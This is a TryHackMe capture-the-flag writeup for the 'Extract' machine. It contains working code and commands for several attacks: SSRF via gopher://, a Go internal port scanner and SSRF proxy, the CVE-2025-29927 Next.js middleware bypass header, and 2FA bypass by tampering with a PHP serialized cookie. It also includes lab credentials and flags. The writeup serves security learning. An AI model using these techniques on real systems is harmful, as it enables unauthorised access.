@@ -1,0 +1,375 @@
+---
+slug: "thm-extract"
+title: "Extract — TryHackMe Writeup"
+date: "2026-07-25"
+platform: "TryHackMe"
+type: "Machine"
+os: "Linux"
+difficulty: "Hard"
+tags:
+  - "Web"
+  - "SSRF"
+  - "Gopher"
+  - "Next.js"
+  - "CVE-2025-29927"
+  - "Authentication Bypass"
+  - "PHP Object Serialization"
+  - "Golang"
+excerpt: "A TryHackMe machine involving Server-Side Request Forgery (SSRF) escalated to internal service interaction via Gopher, bypassing Next.js middleware authentication, and exploiting PHP object serialization for 2FA bypass."
+readTime: "15 min"
+rating: 4.3
+url: "https://asbawy.github.io/writeups/thm-extract"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & Web Enum",
+      desc: "Nmap revealed SSH (22) and Apache (80). The web application hosted on port 80 featured a document preview functionality vulnerable to SSRF.",
+      tools: ["Nmap", "Browser Network Tab"],
+    },
+    {
+      phase: "Enumeration",
+      title: "SSRF & Internal Port Scanning",
+      desc: "Discovered an SSRF vulnerability in the preview functionality. Crafted a custom Golang scanner to find internal ports, discovering services on port 80 and 10000. Used Gopher payload generation to proxy traffic.",
+      technique: "Server-Side Request Forgery (SSRF)",
+      tools: ["Burp Suite", "Golang", "Python"],
+    },
+    {
+      phase: "Foothold",
+      title: "Next.js Auth Bypass (CVE-2025-29927)",
+      desc: "Created a Golang proxy script to interact with the internal service on port 10000 via Gopher SSRF. Identified a Next.js application and bypassed its middleware authentication using CVE-2025-29927.",
+      technique: "Next.js Middleware Authentication Bypass",
+      tools: ["curl", "Golang"],
+    },
+    {
+      phase: "PrivEsc",
+      title: "PHP Object Serialization 2FA Bypass",
+      desc: "Leveraged leaked credentials to access the /management interface on port 80. Bypassed the 2FA mechanism by modifying and URL-encoding a serialized PHP object in the auth_token cookie.",
+      technique: "PHP Object Serialization Modification",
+      tools: ["Browser DevTools", "curl"],
+    },
+  ]}
+/>
+
+---
+
+## Introduction
+
+_Extract_ is an engaging TryHackMe machine focusing on web application vulnerabilities. The attack path starts with a Server-Side Request Forgery (SSRF) flaw in a document preview feature. We escalate this SSRF by utilizing the `gopher://` protocol to scan for and interact with internal services. After proxying our traffic to a hidden Next.js application, we bypass its authentication middleware using CVE-2025-29927 to recover credentials. Finally, we access a restricted management interface and bypass Two-Factor Authentication (2FA) by tampering with a serialized PHP object token.
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+We begin by scanning the target to identify open ports and running services.
+
+```bash
+nmap -sC -sV -p- -T4 10.112.147.90
+```
+
+```text
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 2e:2d:c4:cf:f4:d0:4f:cd:c1:82:9e:9e:e1:b7:07:5b (ECDSA)
+|_  256 d7:0f:2d:3c:1b:45:cb:b5:f7:ab:d8:30:15:22:30:dc (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-title: TryBookMe - Online Library
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+We can see two open ports: SSH (22) and an Apache web server (80). Let's see what is hosted on the web server.
+
+---
+
+## Enumeration
+
+### Analyzing the Web Application
+
+Visiting `http://10.112.147.90:80`, we find a web application named "TryBookMe" for viewing documents. 
+
+![TryBookMe Web Service](https://i.imgur.com/JTJiEIq.png)
+
+When we choose one of the available documents, the application generates a preview. By inspecting the network tab in the browser, we observe that the application sends a request to the `/preview.php` endpoint with a `url` parameter:
+
+`http://10.112.147.90/preview.php?url=http%3A%2F%2Fcvssm1%2Fpdf%2Fdummy.pdf`
+
+![Network Tab Request](https://i.imgur.com/7itP6d7.png)
+
+This structure strongly indicates a potential **Server-Side Request Forgery (SSRF)** vulnerability.
+
+### SSRF Vulnerability Testing
+
+To test for SSRF, we send the request to Burp Suite Repeater and set up a local Python HTTP server (`python3 -m http.server`). We then modify the `url` parameter to point to our local server.
+
+![Directory Listing via SSRF](https://i.imgur.com/4Z4hMKr.png)
+
+The application fetches and renders the directory listing from our local machine, confirming the SSRF! 
+
+Next, we test common payloads to read local files, such as `file:///etc/passwd`.
+
+![SSRF Blocked Error](https://i.imgur.com/s4RpXNX.png)
+
+The application blocks this attempt, returning: `'URL blocked due to keyword: file:/'`.
+
+### Leveraging Gopher Protocol
+
+Since the `file://` scheme is blocked, we can test other protocols. The `gopher://` protocol is particularly useful in SSRF attacks because it allows us to send arbitrary raw data (like HTTP GET or POST requests) to any service without protocol overhead.
+
+Let's test `gopher://` by sending a dummy message to our Python server: `gopher://10.112.72.139:8000/_asbawy_say_hello`
+
+![Working Gopher Payload](https://i.imgur.com/rU9FLcq.png)
+
+We successfully receive the message on our Python server! This confirms we can use the `gopher://` protocol to interact with internal services.
+
+---
+
+## Foothold
+
+### Internal Port Scanning
+
+Since we can interact with internal services using `gopher://`, our next step is to perform a port scan against `127.0.0.1` to discover hidden applications. I used a custom Golang script to automate this process.
+
+```go
+package main
+
+import (
+	"fmt"
+	"io"
+	"net/http"
+	"sync"
+	"time"
+)
+
+const (
+	targetURL = "http://10.112.147.90:80/preview.php?url=http://127.0.0.1:%d/" //change this to your target url 
+	workers   = 100
+	maxPort   = 65535
+	timeout   = 5 * time.Second
+)
+
+func main() {
+	var wg sync.WaitGroup
+	ports := make(chan int, workers)
+
+	client := &http.Client{
+		Timeout: timeout,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	for i := 0; i < workers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for port := range ports {
+				url := fmt.Sprintf(targetURL, port)
+				resp, err := client.Get(url)
+				if err != nil {
+					continue
+				}
+				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+
+				if len(body) == 0 {
+					continue
+				}
+
+				fmt.Printf("[+] Port %d | Status: %d | Size: %d\n", port, resp.StatusCode, len(body))
+			}
+		}()
+	}
+
+	for p := 1; p <= maxPort; p++ {
+		ports <- p
+	}
+	close(ports)
+
+	wg.Wait()
+}
+```
+
+Running the script reveals an internal service on port 10000:
+
+```bash
+go run main.go 
+[+] Port 80 | Status: 200 | Size: 1735
+[+] Port 10000 | Status: 200 | Size: 6131
+```
+
+### SSRF Proxy with Golang
+
+To comfortably interact with the service on port 10000, we can build a proxy that takes our local requests, double-URL encodes them, and routes them through the SSRF vulnerability using the `gopher://` protocol. 
+
+```go
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+)
+
+const (
+	bindAddress  = "127.0.0.1:1234"
+	victimServer = "10.112.147.90"
+	internalHost = "127.0.0.1"
+	internalPort = "10000"
+	readBuffer   = 65536
+)
+
+func pyQuote(s string) string {
+	var buf bytes.Buffer
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
+			c == '_' || c == '.' || c == '-' || c == '~' || c == '/' {
+			buf.WriteByte(c)
+		} else {
+			buf.WriteString(fmt.Sprintf("%%%02X", c))
+		}
+	}
+	return buf.String()
+}
+
+func relayTraffic(client net.Conn) {
+	defer client.Close()
+
+	buffer := make([]byte, readBuffer)
+	n, err := client.Read(buffer)
+	if err != nil || n == 0 {
+		return
+	}
+
+	firstEncode := pyQuote(string(buffer[:n]))
+	doubleEncode := pyQuote(firstEncode)
+
+	exploitURL := fmt.Sprintf(
+		"http://%s/preview.php?url=gopher://%s:%s/_%s",
+		victimServer, internalHost, internalPort, doubleEncode,
+	)
+
+	resp, err := http.Get(exploitURL)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(resp.Body)
+	client.Write(body)
+}
+
+func main() {
+	listener, err := net.Listen("tcp", bindAddress)
+	if err != nil {
+		panic(err)
+	}
+	defer listener.Close()
+
+	fmt.Printf("[+] Visit %s, proxying to %s:%s via %s\n",
+		bindAddress, internalHost, internalPort, victimServer)
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			continue
+		}
+		go relayTraffic(conn)
+	}
+}
+```
+
+```bash
+go run main.go 
+
+[+] Visit 127.0.0.1:1234, proxying to 127.0.0.1:10000 via 10.112.147.90
+```
+
+Now we can visit `http://127.0.0.1:1234` in our browser to seamlessly interact with the internal service.
+
+![Internal Service on Port 10000](https://i.imgur.com/u6K2AJh.png)
+
+### Bypassing Next.js Middleware (CVE-2025-29927)
+
+The internal service displays a warning: _"Unauthorised access to this system is strictly prohibited."_ Attempting to access `/api` redirects us to `/customapi`, indicating authentication controls are in place.
+
+By examining the page source and JavaScript, we identify that the site is built with **Next.js**. Researching Next.js authentication vulnerabilities leads us to **CVE-2025-29927**, which allows bypassing Next.js middleware authentication using a specific HTTP header.
+
+Let's test this bypass:
+
+```bash
+curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://127.0.0.1:1234/customapi
+```
+
+This successfully bypasses the authentication! We retrieve the first flag and a set of credentials: `librarian:L1br4r1AN!!`
+
+<SpoilerFlag flag="THM{363bec60df12c2cadbe9ff35393fa468}" />
+
+---
+
+## Privilege Escalation
+
+### 2FA Authentication Bypass
+
+With our newly acquired credentials, we can explore restricted areas of the main web application on port 80, such as the `/management` endpoint. To simplify access, we update our Golang proxy script to target `internalPort = "80"` instead of `10000`.
+
+![Management Login Interface](https://i.imgur.com/24JkAsk.png)
+
+After logging in with `librarian:L1br4r1AN!!`, we are presented with a Two-Factor Authentication (2FA) prompt.
+
+![2FA Prompt](https://i.imgur.com/KMgp069.png)
+
+Inspecting our browser cookies, we find an `auth_token` that looks suspicious:
+
+![Auth Token Cookie](https://i.imgur.com/7zl9iZ9.png)
+
+```text
+auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D
+```
+
+URL-decoding this value reveals a serialized PHP object:
+
+```php
+O:9:"AuthToken":1:{s:9:"validated";b:0;}
+```
+
+The object contains a boolean attribute `validated` set to `0` (false). We can manipulate this value to bypass the 2FA check by changing `b:0;` to `b:1;`.
+
+We URL-encode our modified object:
+
+```text
+O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D
+```
+
+Finally, we update our cookie in the browser storage and refresh the page, or simply send a `curl` request:
+
+```bash
+curl -s -b "PHPSESSID=p54ou6ghk3flecsbur4socgfm3; auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D" \
+  http://127.0.0.1:1234/management/2fa.php
+```
+
+The authentication bypass is successful, granting us access to the final flag!
+
+<SpoilerFlag flag="THM{804326748394ff9fb288e059653f0db7}" />
+
+![Flag 2](https://i.imgur.com/cLBwVyS.png)
+
+---
+
+## References
+
+- [Server-Side Request Forgery (SSRF)](https://portswigger.net/web-security/ssrf)
+- [Gopher Protocol in SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#gopher)
+- [Next.js Authentication Bypass (CVE-2025-29927)](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
+- [PHP Object Serialization Vulnerabilities](https://portswigger.net/web-security/deserialization/exploiting)
